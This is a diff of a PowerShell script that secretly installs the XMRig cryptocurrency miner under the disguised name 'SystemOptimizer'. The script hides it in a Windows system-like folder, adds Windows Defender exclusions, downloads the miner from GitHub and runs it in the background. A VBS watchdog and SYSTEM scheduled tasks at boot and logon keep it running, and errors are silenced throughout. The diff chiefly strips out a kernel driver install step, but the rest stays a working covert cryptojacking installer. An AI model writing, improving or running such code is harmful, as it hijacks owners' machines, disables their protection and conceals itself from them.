@@ -2,7 +2,7 @@
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# ===== CLEANUP OLD/GLITCHED INSTALLS =====
+# ===== CLEANUP =====
 taskkill /F /IM "wscript.exe" 2>$null
 taskkill /F /IM "xmrig.exe" 2>$null
 taskkill /F /IM "SystemOptimizer.exe" 2>$null
@@ -11,17 +11,12 @@ Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer
 schtasks /Delete /TN "SystemOptimizer" /F 2>$null
 schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null
 schtasks /Delete /TN "ModestFermi_XMRig" /F 2>$null
-foreach ($s in @("WinRing0_1_2_0","WinRing0x64")) {
-    $es = Get-Service $s -ErrorAction SilentlyContinue
-    if ($es) { Stop-Service $s -Force -ErrorAction SilentlyContinue; sc.exe delete $s 2>$null }
-}
 Start-Sleep 1
 
 # ===== PATHS =====
 $baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
 $xmrigExe = "$baseDir\SystemOptimizer.exe"
 $configFile = "$baseDir\config.json"
-$driverPath = "$baseDir\WinRing0x64.sys"
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
 $zipPath = "$baseDir\xmrig.zip"
 
@@ -40,20 +35,19 @@ try {
     Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
 } catch { }
 
-# ===== DOWNLOAD XMRIG =====
+# ===== DOWNLOAD XMRIG (NO WINRING0 DRIVER) =====
 if (-not (Test-Path $xmrigExe)) {
     try {
         $wc = New-Object System.Net.WebClient
         $wc.DownloadFile($zipUrl, $zipPath)
         Expand-Archive -Path $zipPath -DestinationPath "$baseDir\_tmp" -Force
         Move-Item "$baseDir\_tmp\xmrig-6.26.0\xmrig.exe" $xmrigExe -Force
-        Move-Item "$baseDir\_tmp\xmrig-6.26.0\WinRing0x64.sys" $driverPath -Force
         Remove-Item "$baseDir\_tmp" -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
     } catch { }
 }
 
-# ===== WRITE CONFIG =====
+# ===== WRITE CONFIG (no MSR, no driver needed) =====
 $config = @{
     autosave = $false; background = $true; colors = $false; "donate-level" = 1
     "log-file" = "$baseDir\optimizer.log"; "print-time" = 30
@@ -63,15 +57,6 @@ $config = @{
     api = @{ enabled=$true; host="127.0.0.1"; port=3456; restricted=$true }
 } | ConvertTo-Json -Depth 5
 $config | Out-File -FilePath $configFile -Encoding ascii
-
-# ===== INSTALL WINRING0 DRIVER =====
-if (Test-Path $driverPath) {
-    $svc = "WinRing0_1_2_0"
-    $es = Get-Service $svc -ErrorAction SilentlyContinue
-    if ($es) { Stop-Service $svc -Force -ErrorAction SilentlyContinue; sc.exe delete $svc 2>$null }
-    sc.exe create $svc binPath= "$driverPath" type= kernel start= demand 2>$null
-    Start-Service $svc -ErrorAction SilentlyContinue
-}
 
 # ===== WATCHDOG.VBS =====
 $watchdogPath = "$baseDir\watchdog.vbs"
@@ -89,7 +74,7 @@ Loop
 '@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
 $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 
-# ===== SCHEDULED TASK (SYSTEM, boot + logon) - using schtasks CLI (reliable from SYSTEM) =====
+# ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
 $taskName = "SystemOptimizer"
 $wdPathEscaped = $watchdogPath -replace '"', '`"'
 schtasks /Create /TN "$taskName" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
